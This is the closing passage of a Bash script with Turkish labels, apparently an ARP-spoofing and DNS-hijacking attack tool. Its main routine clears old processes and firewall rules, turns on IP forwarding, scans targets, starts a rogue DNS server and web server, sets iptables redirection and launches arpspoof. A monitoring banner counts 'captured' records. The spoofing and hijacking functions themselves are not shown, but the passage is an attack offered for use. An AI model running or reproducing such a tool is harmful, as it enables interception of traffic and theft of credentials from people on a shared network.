            echo -e "${MAGENTA}║${NC} Yakalanan Kayıtlar : ${YELLOW}$(grep -c "YAKALANDI" "$LOG_FILE" 2>/dev/null || echo "0")${NC}"
            echo -e "${MAGENTA}╠════════════════════════════════════════════════════════════════╣${NC}"
            echo -e "${MAGENTA}║${NC} ${RED}Script sürekli çalışıyor! Durdurmak için CTRL+C${NC}"
            echo -e "${MAGENTA}╚════════════════════════════════════════════════════════════════╝${NC}"
            echo ""
            
            log_message "INFO" "İstatistik: $((counter/60))dk çalışma, $TARGET_COUNT hedef, $(ps aux | grep -c "[a]rpspoof") ARP süreç"
        fi
    done
    
    # Bu satır ASLA çalışmayacak çünkü while true sonsuz döngü
    # Sadece CTRL+C ile çıkılabilir
}

# ============================================================================
# ANA PROGRAM AKIŞI
# ============================================================================

main() {
    print_banner
    
    log_message "INFO" "Script başlatıldı: $(date)"
    log_message "INFO" "Log dosyası: $LOG_FILE"
    
    # Önceki kalıntıları temizle
    log_message "INFO" "Önceki süreçler temizleniyor..."
    pkill -9 arpspoof 2>/dev/null
    pkill -9 -f "dnsmasq.*--no-daemon" 2>/dev/null
    fuser -k 8080/tcp 2>/dev/null
    iptables -t nat -F 2>/dev/null
    echo 0 > /proc/sys/net/ipv4/ip_forward
    ip -s -s neigh flush all &>/dev/null
    sleep 2
    
    # IP forwarding etkinleştir
    echo 1 > /proc/sys/net/ipv4/ip_forward
    log_message "SUCCESS" "IP forwarding etkinleştirildi"
    
    # Adım 1: Ağ bilgilerini topla
    gather_network_info
    
    # Adım 2: Hedefleri tara
    scan_targets
    
    # Adım 3: DNS sunucusunu başlat
    setup_dns_server
    
    # Adım 4: Web sunucusunu başlat
    setup_web_server
    
    # Adım 5: iptables kurallarını ayarla
    setup_iptables
    
    # Adım 6: ARP Spoofing başlat
    start_arp_spoofing
    
    # Adım 7: Saldırı durumunu göster
    show_attack_status
    
    # Adım 8: Monitoring döngüsü
    monitoring_loop
}

# Scripti çalıştır
main "$@"
